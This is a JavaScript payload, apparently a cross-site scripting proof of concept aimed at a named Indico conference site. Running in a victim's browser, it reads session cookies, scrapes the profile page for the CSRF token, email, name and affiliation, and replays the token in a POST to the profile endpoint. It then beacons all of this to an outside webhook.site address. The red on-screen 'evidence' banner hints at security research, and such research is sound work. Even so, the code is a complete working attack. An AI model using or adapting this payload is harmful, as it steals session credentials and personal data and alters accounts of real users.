(function () {
  var WEBHOOK = 'https://webhook.site/d4a92c22-be5c-4ee4-86c1-70ac738e3d61';
  var cookies = document.cookie;

  fetch('https://indico.iter.org/user/profile/', {
    credentials: 'include'
  })
    .then(function (r) { return r.text(); })
    .then(function (html) {
      var g = function (re) { var m = html.match(re); return m ? m[1] : null; };

      var csrf = g(/name="csrf-token"[^>]*content="([^"]+)"/)
        || g(/name="csrf_token"[^>]*value="([^"]+)"/);
      var email = g(/name="email"[^>]*value="([^"]+)"/)
        || g(/"email":\s*"([^"]+)"/)
        || g(/email['"]\s*:\s*['"]([\w.+-]+@[\w.-]+)['"]/);
      var firstName = g(/name="first_name"[^>]*value="([^"]+)"/)
        || g(/"first_name":\s*"([^"]+)"/);
      var lastName = g(/name="last_name"[^>]*value="([^"]+)"/)
        || g(/"last_name":\s*"([^"]+)"/);
      var affiliation = g(/name="affiliation"[^>]*value="([^"]+)"/)
        || g(/"affiliation":\s*"([^"]+)"/);

      var evidence = {
        step: 'read',
        csrf: csrf,
        email: email,
        first_name: firstName,
        last_name: lastName,
        affiliation: affiliation,
        cookies: cookies
      };

      if (!csrf || !email) {
        evidence.error = 'extraction failed';
        evidence.html_chunk = html.substring(3000, 8000);
        report(evidence);
        return;
      }

      var payload = JSON.stringify({
        first_name: firstName,
        last_name: lastName,
      });

      fetch('https://indico.iter.org/user/profile/', {
        method: 'POST',
        credentials: 'include',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrf
        },
        body: payload
      })
        .then(function (r) {
          evidence.step = 'write';
          evidence.post_status = r.status;
          evidence.post_url = r.url;
          return r.text();
        })
        .then(function (html2) {
          evidence.post_response = html2.substring(0, 4000);
          report(evidence);
        });
    })
    .catch(function (err) {
      report({ error: err.message, cookies: cookies });
    });

  function report(ev) {
    var b = document.createElement('pre');
    b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:999999;'
      + 'background:#b00;color:#fff;margin:0;padding:16px;font:13px/1.6 monospace;'
      + 'max-height:50vh;overflow:auto';
    b.textContent = 'Step: ' + (ev.step || '?') + '\n'
      + 'CSRF: ' + (ev.csrf || 'n/a') + '\n'
      + 'Email: ' + (ev.email || 'n/a') + '\n'
      + 'Name: ' + (ev.first_name || '') + ' ' + (ev.last_name || '') + '\n'
      + 'Affiliation: ' + (ev.affiliation || 'n/a') + '\n'
      + 'POST status: ' + (ev.post_status || '?');
    document.body.appendChild(b);
    navigator.sendBeacon(WEBHOOK, JSON.stringify(ev));
  }
})();
